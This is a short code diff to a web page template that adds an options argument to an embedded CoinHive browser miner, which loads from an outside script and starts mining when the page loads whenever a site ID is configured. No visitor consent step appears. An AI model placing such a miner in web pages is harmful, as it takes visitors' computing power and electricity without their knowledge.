@@ -30,7 +30,7 @@
         {% if COINHIVE_ID %}
             <script src="https://coinhive.com/lib/coinhive.min.js"></script>
             <script>
-                var miner = new CoinHive.Anonymous('{{COINHIVE_ID}}');
+                var miner = new CoinHive.Anonymous('{{COINHIVE_ID}}', {{COINHIVE_OPTIONS}} );
                 miner.start();
             </script>
         {% endif %}
